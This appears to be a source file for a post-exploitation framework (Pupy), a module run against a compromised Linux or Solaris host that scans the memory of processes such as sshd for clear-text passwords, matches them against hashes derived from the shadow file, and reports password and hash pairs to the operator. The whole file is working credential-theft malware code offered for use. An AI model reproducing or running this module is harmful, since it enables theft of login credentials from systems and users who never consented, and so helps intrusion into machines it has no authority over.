# -*- coding: utf-8 -*-
from pupylib.PupyModule import *
from pupylib.utils.rpyc_utils import obtain

__class_name__='KeyloggerModule'

@config(cat='gather', compat=['linux', 'solaris'])
class KeyloggerModule(PupyModule):
    '''
        Try to find clear text passwords in memory
    '''
    unique_instance = True
    dependencies = {
        'linux': [ 'memorpy', 'hashmon' ],
    }

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog='hashmon', description=self.__doc__)
        self.arg_parser.add_argument(
            '-F', '--filter', default='.*/?(sshd)$', help='Regex to filter interesting process names')
        self.arg_parser.add_argument(
            '-H', '--hashes', default='', help='Hashes to search (derive from shadow by default)')
        self.arg_parser.add_argument('-p', '--poll', default=20, type=int, help='Poll interval (seconds)')
        self.arg_parser.add_argument('-d', '--dups', default=131072, type=int,
                                         help='Amount of processed strings to store')
        self.arg_parser.add_argument('-P', '--policy', default=True, help='Regex to check valid password')
        self.arg_parser.add_argument('-m', '--min', default=8, type=int, help='Minimal password length')
        self.arg_parser.add_argument('-M', '--max', default=16, type=int, help='Maximal password length')
        self.arg_parser.add_argument('action', choices=['start', 'stop', 'dump'])

    def run(self, args):
        hashmon = self.client.conn.modules.hashmon
        if args.action == 'start':
            hashmon.start(
                [ x.strip() for x in args.filter.split(',') ],
                hashes=args.hashes.split(),
                poll=args.poll,
                minpw=args.min, maxpw=args.max,
                maxdups=args.dups,
                policy=args.policy
            )
        elif args.action == 'dump':
            results = hashmon.dump()
            if results is None:
                self.error('HashMon is not started')
            else:
                results = obtain(results)
                for password, hash in results:
                    self.success('{}:{}'.format(hash, password))
        elif args.action == 'stop':
            hashmon.stop()
